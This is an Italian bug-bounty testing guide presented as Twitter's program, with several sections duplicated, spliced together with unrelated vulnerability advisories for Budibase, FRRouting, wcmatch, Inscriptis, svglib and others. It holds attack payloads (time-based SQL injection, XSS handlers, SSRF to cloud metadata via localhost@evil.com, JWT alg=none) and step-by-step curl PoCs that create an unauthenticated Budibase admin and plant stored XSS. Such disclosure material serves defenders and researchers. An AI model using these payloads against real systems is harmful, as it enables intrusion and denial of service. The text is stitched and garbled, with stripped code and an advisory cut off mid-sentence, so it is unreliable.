titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: CVE-2011-10042: HTTP::Session versions before 0.43 for Perl allow memcached command injection via unfiltered session...
descrizione:
HTTP::Session versions before 0.43 for Perl allow memcached command injection via unfiltered session ids in HTTP::Session::Store::Memcached.

The session id from the client's cookie reaches memcached unchanged as the cache key.

A CR and LF in the session id end the cache command early, and the server reads the bytes after them as further commands.

titolo: CVE-2026-120687: The Lightbox & Modal Popup WordPress Plugin – FooBox plugin for WordPress is vulnerable to Stored DO...
descrizione: The Lightbox & Modal Popup WordPress Plugin – FooBox plugin for WordPress is vulnerable to Stored DOM-Based Cross-Site Scripting via the 'img alt attribute inside .wp-caption container' parameter in all versions up to, and including, 2.8.7 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. This is exploitable by Subscriber-level users when bbPress is installed, as its bbp_filter_kses filter chain permits img and pre tags while preserving numeric character references inside attribute values, allowing encoded payloads to bypass save-time sanitization and reach the vulnerable sink fully intact. Exploitation by attackers with subscriber-level access and above requires that bbPress 2.6.20 is installed, a public forum exists, and either the first topic has already been approved or subsequent topics clear moderation. On a default installation, where that is not configured, the vulnerability requires attackers with contributor-level access and above.

titolo: CVE-2026-129456: In FRRouting, bgpd frees the sub-TLV chain of a Tunnel Encapsulation attribute (type 23) while route...
descrizione: In FRRouting, bgpd frees the sub-TLV chain of a Tunnel Encapsulation attribute (type 23) while routes stored by bgpd still point to it, if the attribute is received from a neighbor that has "soft-reconfiguration inbound" configured. A cache added to speed up attribute interning while processing the prefixes of an UPDATE checks whether an interned attribute set may be reused by comparing the parsed attributes with themselves, so the check always succeeds. Interning the parsed attributes for the Adj-RIB-In removes the Tunnel Encapsulation sub-TLVs from them, and the copy that bgpd then interns for the route reuses the cached attribute set, which still holds the sub-TLVs, without taking a reference on them. When the route is later replaced, withdrawn or cleared, for example when the session goes down, the sub-TLV chain is freed while still in use, and bgpd then reads it, decrements a reference count inside it and frees it a second time. In the reporter's build without AddressSanitizer this ended in an assertion failure in bgpd's memory accounting, aborting bgpd and dropping all BGP sessions on the router, and the neighbor can repeat it each time bgpd restarts. Because freed heap memory is written to and freed again, consequences beyond a crash cannot be ruled out. An established BGP session is required, and the attribute does not need to be malformed. bgpd processes attribute 23 from every neighbor, including eBGP neighbors, unless it is explicitly discarded, although RFC 9012 requires it to be filtered on eBGP sessions by default. Neighbors without "soft-reconfiguration inbound" are not affected.

titolo: GHSA-25qc-m4pw-2w8r: Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)
descrizione:
## Description

### Summary

On a self-hosted, single-tenant Budibase instance (`multiTenancy:false`), the public bootstrap endpoint `POST /api/global/users/init` remains fully exploitable **after** the instance has been provisioned. Its "already initialised" guard (`checkAnyUserExists()`) is evaluated inside a **tenant-scoped** database context derived from an **attacker-controlled `tenantId`** in the request body. Because the tenancy layer never constrains that `tenantId` to the only legitimate tenant (`default`) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (`<tenantId>_global-db`) and a **global-admin** user document (`admin.global = true`, `builder.global = true`) inside it - with no authentication and no CSRF token.

This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.

### Details

Root cause chain (source, tag v3.44.0):

1. `packages/worker/src/api/index.ts:41` - `POST /api/global/users/init` is in `PUBLIC_ENDPOINTS`, so `auth.buildAuthMiddleware(PUBLIC_ENDPOINTS)` marks it `publicEndpoint` and the "no public access to worker" gate (`api/index.ts:159-165`) lets it through **without any session**. It is also in `NO_TENANCY_ENDPOINTS` (`api/index.ts:83`), so the tenancy middleware does **not** pin the request to `default` - the tenant is taken verbatim from the request body - and in `NO_CSRF_ENDPOINTS`.
2. `packages/worker/src/middleware/cloudRestricted.ts:10,25` - the `cloudRestricted` guard only enforces the internal API key when `!env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL`. On a self-hosted instance (`SELF_HOSTED=true`) it is a **no-op** (`return next()`), so `cloudRestrictedRoutes` provides no protection here.
3. `packages/worker/src/api/routes/global/users.ts:69-79` - `cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser)`.
4. `packages/worker/src/api/controllers/global/users.ts:232` - the handler runs `await tenancy.doInTenant(tenantId, …)` using the **attacker-supplied** `tenantId`.
5. `packages/worker/src/api/controllers/global/users.ts:238` - the only guard, `const userExists = await checkAnyUserExists()`, throws 403 only if a user exists **in the current tenant context**.
6. `packages/worker/src/utilities/users.ts:3-15` - `checkAnyUserExists()` calls `tenancy.getGlobalDB()`, which resolves to `<tenantId>_global-db`. For any unused `tenantId` this DB is empty → the guard passes → `userSdk.db.createAdminUser(email, tenantId, …)` (`users.ts:247`) creates a full global admin.

The defect is **incorrect authorization scoping**: the single-tenant deployment invariant ("only tenant `default` exists; init is one-time") is never enforced against the request-supplied `tenantId`, so the guard is evaluated against a namespace the attacker chooses.

Configuration confirmed via `GET /api/system/environment` → `{"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}`.

### PoC

Target `http://127.0.0.1:3014` (Budibase `v3.44.0-cloud.2`). **No credentials, no cookies, no CSRF token.** All values real, captured live on 2026-09-02; nothing redacted.

---

#### Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (`default`)

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 82

{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

---

#### Step 2 - PAYLOAD: supply any unused `tenantId` → the guard is bypassed and a global admin is created, fully unauthenticated

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Request**

```http
POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 78

{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}
```

**Burp - Response**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}
```

The single differential - `tenantId:"default"` → 403, `tenantId:"f7poc"` → 200 with a persisted `us_…` id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.

---

#### Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guard

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7pocb@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}
```

Each unique `tenantId` is a fresh write primitive - an attacker loops `tenantId=a0001,a0002,…` to create unbounded databases + admin docs (DoS).

---

#### Step 4 & 5 - datastore side-effect: a new `<tenant>_global-db` and a real global-admin document

Read directly from CouchDB inside the container (`$COUCH_DB_URL` = `http://admin:…@127.0.0.1:5984`):

```
GET /_all_dbs =>
[
 "app_cc322a9cd27a492eb934f43b146c6e81",
 "app_dev_cc322a9cd27a492eb934f43b146c6e81",
 "f7poc_global-db",     <-- created by the unauthenticated init call (tenantId=f7poc)
 "global-db"            <-- legitimate default-tenant global DB
]

rogue DB 'f7poc_global-db' present: True
```

The document created in `f7poc_global-db` is a full global admin:

```json
{
  "_id": "us_d0c2b6c9014a43e2899a2770d2e6280c",
  "email": "pwn-f7poc@evil.test",
  "admin":   { "global": true },
  "builder": { "global": true },
  "tenantId": "default",
  "roles": {}
}
```

---

#### Step 6 - ceiling check (honest): the injected admin cannot log in while multi-tenancy is off

```bash
curl -s -i -X POST 'http://127.0.0.1:3014/api/global/auth/f7poc/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn-f7poc@evil.test","password":"Pwned!2026#bb"}'
```

**Burp - Response**

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"Invalid credentials","status":403}
```

With `multiTenancy:false` the login flow forces the `default` tenant, so the injected admin is **not** usable to log into the running default-tenant instance. The provable impact is therefore control-bypass + unauthenticated persistent datastore writes / DoS + creation of rogue admin accounts that become active if multi-tenancy is later enabled or during tenant-iterating operations (restore/migration).

### Impact

**Type:** Missing/incorrect authorization on a critical function - **unauthenticated bypass of the one-time initialization guard**, yielding anonymous global-admin-document and database creation.

**Who is impacted:** every self-hosted single-tenant Budibase instance exposing the worker API (via the front nginx). Any unauthenticated network attacker can:
- **defeat the first-run setup lock** that is supposed to be permanently closed after provisioning;
- **create global-admin user documents** in attacker-named tenants with no credentials (latent rogue admins that activate if multi-tenancy is enabled or during migration/restore);
- **create an unbounded number of CouchDB databases** (`<rand>_global-db`) and documents - a resource-exhaustion / DoS vector against the datastore (disk, inodes, file descriptors, the `_dbs` metadata shard).

titolo: GHSA-r2q3-7m4h-63qg: Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
descrizione: ## Description ### Summary A **low-privileged application end-user** (role `BASIC` - **not** a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a **builder or admin** later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section **Formula** column editor, or any binding drawer), the stored value is rendered as **raw HTML** and the attacker's JavaScript executes in the Builder's origin. The Builder SPA is served by nginx with **no Content-Security-Policy** (the CSP middleware only decorates the server-rendered *published-app* document, not `/builder/`). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a **cross-privilege stored XSS** (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS. ### Details **Root cause 1 - the escaper is a no-op.** `packages/frontend-core/src/utils/jsonFormatter.ts` (`format()`): ```js jsonString = jsonString .replace(/&/g, "&") // no-op: replaces "&" with "&" (should be "&") .replace(//g, ">") // no-op (should be ">") return jsonString.replace( /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g, (match) => { if (/^"/.test(match)) { if (/:$/.test(match)) { color = colors.keyColor } // KEY: NOT escaped else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped } return `${match}` }) ``` Only quoted JSON *string values* are passed through `escapeHtml`. Everything else is emitted verbatim, because the leading `.replace(/&/g,"&")…` chain replaces each character with itself. Two consequences: 1. A **raw, non-JSON string** (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned **completely un-escaped**. 2. **Object keys** are never escaped. **Root cause 2 - the output is injected with `{@html}`.** `packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte`: - line 116: `{@html logLine.log}` - line 128: `{@html highlightedResult}` `highlightedResult` is the output of `JsonFormatter.format()`, so the un-escaped attacker string is inserted into the DOM as live markup. **Root cause 3 - binding output is not entity-escaped upstream.** Every `{{ … }}` statement is wrapped by the `ALL` helper in `packages/string-templates/src/helpers/index.ts`, which returns a `Handlebars.SafeString`; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/`{@html}` sink. **Root cause 4 - no CSP on the Builder.** `GET /builder/*` is served as a static SPA by nginx with **no** `Content-Security-Policy` header (verified live below). The `contentSecurityPolicy` middleware (`packages/backend-core/src/middleware/contentSecurityPolicy.ts`) only sets a nonce-based CSP on the server-rendered *published-app* document (`serveApp`). So in the Builder origin there is no `script-src` restriction and inline event handlers run freely. **Cross-privilege data channel.** Internal-table dev/prod data live in separate databases, but **external datasources are queried live and shared** between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A `BASIC` app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. `RowUtils.generateGoldenSample()` even *prefers the longest string per column*, guaranteeing a long payload is the sample the Preview evaluates. **Payload shape note.** `jsonFormatter.format()` tokenises quoted strings, digits and `true/false/null` into ``s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. `` - survives verbatim and executes. ### PoC **Environment used for this reproduction (all values real / unredacted):** | Item | Value | |------|-------| | Target | `http://127.0.0.1:3014` (self-host single image, Budibase `v3.44.0`, commit `d1ed6085`) | | Dev app id | `app_dev_cc322a9cd27a492eb934f43b146c6e81` | | Prod app id | `app_cc322a9cd27a492eb934f43b146c6e81` | | External Postgres table | `datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl` | | Attacker (low-priv `BASIC`) | `lowuser@budibase.local` / `LowUser!2026#bb` | | Victim (builder/admin) | `admin@budibase.local` / `LabAdmin!2026#bb` | --- #### Step 0 - (precondition, performed once by the builder) a data-collection app grants `BASIC` write on the table ```bash # grant the low user BASIC role on the app curl -s -b creds/admin.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/users \ -d '{"_id":"us_df036f58299242608f665700b1618057","_rev":"1-f24520b49fae0a6f4a23dced7a82fcc8","email":"lowuser@budibase.local","builder":{"global":false},"admin":{"global":false},"roles":{"app_cc322a9cd27a492eb934f43b146c6e81":"BASIC"},"tenantId":"default","status":"active"}' # open write permission on the table to BASIC (typical of feedback/survey/contact apps) curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/permission/BASIC/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/write" curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/applications/app_dev_cc322a9cd27a492eb934f43b146c6e81/publish" ``` --- #### Step 1 - ATTACKER logs in (low-priv `BASIC` user) ```bash curl -s -i -c creds/low.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/auth/default/login \ -d '{"username":"lowuser@budibase.local","password":"LowUser!2026#bb"}' ``` **Burp - titolo: GHSA-53pm-wgxf-c6qf: wcmatch: Polynomial-time ReDoS when matching untrusted names against multi-star patterns (default flags)
descrizione:
# Summary

With default flags, a pattern that contains several `*` wildcards takes polynomial time, O(n^k) for k stars, to reject a crafted file name. The pattern is an ordinary developer constant such as `*_*_*_*_*.csv`; only the string being matched comes from the attacker. A 255-byte file name (the maximum on common filesystems) takes 73 s with `fnmatch.fnmatch()` and 86 s with `glob.globmatch()`. The standard library's `fnmatch` handles the same input in under a millisecond.

This is different from GHSA-84v8-qmgq-9g88: that advisory covers extglob patterns, while this case needs no flags and no attacker-controlled pattern.

# Details

Every `*` is translated to a lazy `.*?` (`_STAR`, `wcmatch/_wcparse.py:212`; `_PATH_STAR` `[^/]*?`, `:218`), which is emitted in `_handle_star` (`:1405-1424`):

```text
*_*_*_*_*.csv  ->  ^(?s:(?=.)(?![.]).*?_.*?_.*?_.*?_.*?\.csv)$
```

When the subject consists of many `_` and does not end in `.csv`, the regex engine tries every way of splitting it between the stars. CPython fixed the same problem in its own `fnmatch` (bpo-40480) by making every star segment except the last one atomic.

# PoC

```python
import time, fnmatch as std
from wcmatch import fnmatch, glob

for pat, n in [('*_*_*_*.csv', 255), ('*_*_*_*.csv', 400), ('*_*_*_*_*.csv', 150),
               ('*_*_*_*_*.csv', 200), ('*_*_*_*_*.csv', 255)]:
    name = '_' * n
    t = time.perf_counter(); fnmatch.fnmatch(name, pat); w = time.perf_counter() - t
    t = time.perf_counter(); std.fnmatchcase(name, pat); s = time.perf_counter() - t
    print(f'{pat:15} len={n}  wcmatch={w:.3f}s  stdlib={s:.5f}s')

t = time.perf_counter(); glob.globmatch('uploads/' + '_' * 255, 'uploads/*_*_*_*_*.csv')
print(f'globmatch {time.perf_counter() - t:.2f}s')
```

wcmatch 11.1, CPython 3.13, macOS:

```text
*_*_*_*.csv     len=255  wcmatch=1.412s   stdlib=0.00001s
*_*_*_*.csv     len=400  wcmatch=8.599s   stdlib=0.00004s
*_*_*_*_*.csv   len=150  wcmatch=5.333s   stdlib=0.00003s
*_*_*_*_*.csv   len=200  wcmatch=22.415s  stdlib=0.00007s
*_*_*_*_*.csv   len=255  wcmatch=72.732s  stdlib=0.00047s
globmatch 85.75s
```

`glob.glob('*_*_*_*.csv', root_dir=d)` on a real directory that contains one file named `'_' * 255` takes 1.7 s.

# Impact

Applications that match untrusted names against multi-star patterns can be blocked on a single CPU core for minutes per name. Examples: upload handlers, archive or object-store key filters, and `glob`/`WcMatch` scans of directories where other users can create files. No authentication is needed.

# Fix

Emit every star segment except the last one as an atomic group, as the standard library does. On Python 3.11 and later use `(?>.*?_)`; on 3.10 use the lookahead/backreference form from `fnmatch._join_translated_parts`. For example:

```text
^(?s:(?=.)(?![.])(?>.*?_)(?>.*?_)(?>.*?_)(?>.*?_).*?\.csv)$
```

This rejects the 255-byte name in under 1 ms. On my spot-check inputs it gives the same results as the current regex. The same change applies to `_PATH_STAR`.

titolo: GHSA-q87h-c5m7-659j: Inscriptis: Quadratic memory growth from sibling <table> elements in get_text()
descrizione:
# Summary Every sibling `` adds another level of the parent's indentation, so the size of `get_text()` output grows quadratically with the number of tables. In the measurements below, a 240 KB HTML document produces about 1 billion characters and uses about 1 GB of memory. # Details `table_end_handler()` (`model/tag/table_tag.py`) writes the rendered table into the parent element with `HtmlElement.write_verbatim_text()` (`model/html_element.py`). For a block-level parent, `write_verbatim_text()` calls `canvas.open_block()`, which pushes the parent's `padding_inline` onto the prefix stack. The following `close_block()` never pops it; only `Canvas.close_tag()` calls `prefix.remove_last_prefix()`. So each table leaves one extra padding entry on the stack. This has been present since 2.0 (commit 84ec720). ```python >>> get_text('
    ' + '
a
' * 4 + '') ' a\n \n a\n \n a\n \n a\n ' ``` # PoC ```python import sys, time, resource from inscriptis import get_text n = int(sys.argv[1]) html = "
    " + "
    " * n + "
" t = time.time(); out = get_text(html) print(len(html), f"{time.time()-t:.2f}s", len(out), resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 2**20, "MiB") ``` inscriptis 2.7.5, Python 3.11, macOS (2.0.0 behaves the same): | tables | HTML | time | output chars | peak RSS | |---|---|---|---|---| | 1,000 | 15 KB | 0.02 s | 4.0 M | 31 MiB | | 4,000 | 60 KB | 0.33 s | 64 M | 154 MiB | | 8,000 | 120 KB | 1.31 s | 256 M | 463 MiB | | 16,000 | 240 KB | 5.63 s | 1,024 M | 991 MiB | When the input doubles, output size and memory grow about 4 times. # Impact Any application that converts untrusted HTML with inscriptis can be made to exhaust memory with a small document. This includes crawlers, RAG and LLM ingestion pipelines, and `inscriptis-api`. No authentication and no user interaction are needed. # Fix ```diff self.canvas.write(self, text, whitespace=WhiteSpace.pre) if self.display == Display.block: + self.canvas.current_block.prefix.remove_last_prefix() self.canvas.close_block(self) ``` With this change the 240 KB input above produces 288 K characters in 0.14 s with 27 MiB peak RSS. A single table renders exactly as before, and the existing test suite passes.

titolo: GHSA-555j-qj3j-c8jv: svglib: Exponential resource consumption via nested <use> references in svg2rlg
descrizione: # Summary `svg2rlg()` expands `` references without any limit on the total number of expansions. Only direct cycles are rejected (`CircularRefError`). A group containing N `` elements that point to another such group multiplies the work by N per nesting level, so an SVG of about 1.4 KB makes svglib clone and render over 100,000 nodes, taking tens of seconds of CPU time and hundreds of MiB of memory. Each additional level adds about 245 bytes to the document and multiplies time by ~10. This is the SVG `` variant of the XML "billion laughs" attack (the same class as librsvg CVE-2019-20446). # Details `SvgRenderer.renderUse()` in `src/svglib/svglib.py`: ```python try: item = self.xlink_href_target(node, group=group) except CircularRefError: node.parent.etree_element.remove(node.etree_element) return group ... if len(node.getchildren()) == 0: # Append a copy of the referenced node as the child (if not # already done) node.append(copy.deepcopy(item)) self.renderNode(list(node.iter_children())[-1], parent=group) ``` The referenced node is deep-copied under the `` element and rendered. Any `` elements inside the copied subtree go through `renderUse()` again. `xlink_href_target()` raises `CircularRefError` only for a direct cycle, so a reference DAG with fan-out is expanded fully: `fan ** levels` renders. Payload shape (fan = 10, levels = 5): ```xml ``` # Impact Denial of service (CPU and memory exhaustion) for any application that renders SVG from an untrusted source with svglib: thumbnail/preview generation, SVG-to-PDF conversion, report generation. Only the SVG document needs to be attacker-controlled; no non-default option is required. The same happens through `xhtml2pdf`, which depends on svglib to render SVG images. An HTML document containing `` passed to `pisa.CreatePDF()` triggers the expansion. HTML-to-PDF conversion of user-supplied content is a common use of xhtml2pdf in web applications. # Reproduction Minimal local PoC, non-destructive: ```python import io, time from svglib.svglib import svg2rlg def make(levels, fan=10): parts = ['') return "".join(parts).encode() for levels in (3, 4, 5): data = make(levels) t = time.time() svg2rlg(io.BytesIO(data)) print(levels, len(data), f"{time.time() - t:.1f}s") ``` Result on svglib 2.3.0 (commit `5d28646`), Python 3.12, macOS: | 